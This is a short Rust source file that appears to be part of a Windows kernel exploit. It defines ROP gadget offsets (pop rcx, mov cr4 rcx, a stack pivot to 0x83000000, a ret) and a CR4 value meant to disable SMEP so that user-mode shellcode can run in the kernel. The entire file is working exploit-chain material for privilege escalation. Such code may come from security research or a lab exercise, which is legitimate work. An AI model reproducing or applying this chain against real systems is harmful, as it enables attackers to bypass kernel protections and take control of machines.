// 0x0000000140208cc8 : pop rcx ; ret
pub const POP_RCX_GADGET: u64 = 0x208cc8;

// 0x000000014039f0c7 : mov cr4, rcx ; ret
pub const MOV_CR4_GADGET: u64 = 0x39f0c7;

// SMEP VALUE
pub const SMEP_VALUE: usize = 0x0000000000b50ef8;

// 0x00000001405e1ff2 : mov esp, 0x83000000 ; ret
pub const STACK_PIVOT_GADGET: u64 = 0x5e1ff2;

// 0x000000014020003e : ret
pub const ROP_NOP_GADGET: u64 = 0x20003e;
